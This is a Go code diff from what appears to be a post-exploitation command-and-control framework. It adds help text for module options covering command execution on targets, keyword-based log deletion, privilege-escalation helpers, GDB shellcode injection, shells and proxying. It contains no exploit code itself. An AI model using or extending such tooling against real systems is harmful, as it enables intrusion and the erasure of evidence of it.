@@ -148,7 +148,7 @@ var PersistMethods = map[string]string{
 }
 
 // Module help info
-var ModuleDocs = map[string]string{
+var ModuleComments = map[string]string{
 	ModCMD_EXEC:     "Run a single command on a target",
 	ModCLEAN_LOG:    "Delete lines containing keyword from *tmp logs",
 	ModLPE_SUGGEST:  "Run linux-smart-enumeration or linux exploit suggester",
@@ -160,6 +160,39 @@ var ModuleDocs = map[string]string{
 	ModINJECTOR:     "Inject shellcode into a running process with GDB",
 	ModGET_ROOT:     "Try some built-in LPE exploits",
 	ModREVERSEPROXY: "Manually proxy agents who are unable to use our forward proxy",
+}
+
+// Module help for options, does not include every module since not all modules need args
+var ModuleHelp = map[string]map[string]string{
+	ModCMD_EXEC: {
+		"cmd_to_exec": "Press TAB for some hints",
+	},
+	ModCLEAN_LOG: {
+		"keyword": "Delete all log entries containing this keyword",
+	},
+	ModLPE_SUGGEST: {
+		"lpe_helper": "'linux-smart-enumeration' or 'linux-exploit-suggester'?",
+	},
+	ModPROXY: {
+		"port":   "Port of our local proxy server",
+		"status": "Turn proxy on/off",
+	},
+	ModPORT_FWD: {
+		"to_port":     "Port (to forward to) on agent/CC side",
+		"listen_port": "Listen on CC/agent side",
+		"switch":      "Turn port mapping on/off, or use `reverse` mapping",
+	},
+	ModSHELL: {
+		"shell": "Shell program to run",
+		"args":  "Command line args of the shell program",
+		"port":  "The (sshd) port that our shell will be using",
+	},
+	ModINJECTOR: {
+		"pid": "Target process PID, set to 0 to start a new process (sleep)",
+	},
+	ModREVERSEPROXY: {
+		"addr": "Target host to proxy, we will connect to it and proxy it out",
+	},
 }
 
 // Config build.json config file
